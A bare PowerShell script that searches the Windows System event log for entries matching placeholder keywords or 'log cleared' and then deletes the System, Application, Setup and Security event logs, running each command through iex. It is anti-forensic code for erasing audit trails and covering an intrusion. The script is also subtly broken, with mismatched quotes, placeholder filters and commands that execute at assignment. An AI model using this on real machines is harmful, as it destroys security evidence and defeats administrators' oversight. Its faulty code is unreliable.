$hi = 'Get-EventLog System | Where-Object {$_.Message -like "*enter*keywords*here"} | ForEach-Object { Remove-EventLog -LogName System }'
$hi8 = Get-EventLog System | Where-Object {$_.message -like "*log*cleared" } | ForEach-Object { Remove-EventLog -logname System}
$hi7 = Get-EventLog System | Where-Object {$_.message -like "*log*cleared" } | ForEach-Object { Remove-EventLog -logname Application}
$hi6 = Get-EventLog System | Where-Object {$_.message -like "*log*cleared" } | ForEach-Object { Remove-EventLog -logname Setup }
$hi5 = Get-EventLog System | Where-Object {$_.message -like "*log*cleared" } | ForEach-Object { Remove-EventLog -logname security }
$hi4 = Get-EventLog System | Where-Object {$_.message -like "*enter*keywords*here""} | ForEach-Object { Remove-EventLog -logname Security }
$hi3 = Get-EventLog System | Where-Object {$_.message -like "*enter*keywords*here""} | ForEach-Object { Remove-EventLog -logname Application }
$hi2 = Get-EventLog System | Where-Object {$_.message -like "*enter*keywords*here""} | ForEach-Object { Remove-EventLog -logname setup }
iex $hi
iex $hi2
iex $hi3
iex $hi4
iex $hi5
iex $hi6
iex $hi7
iex $hi8
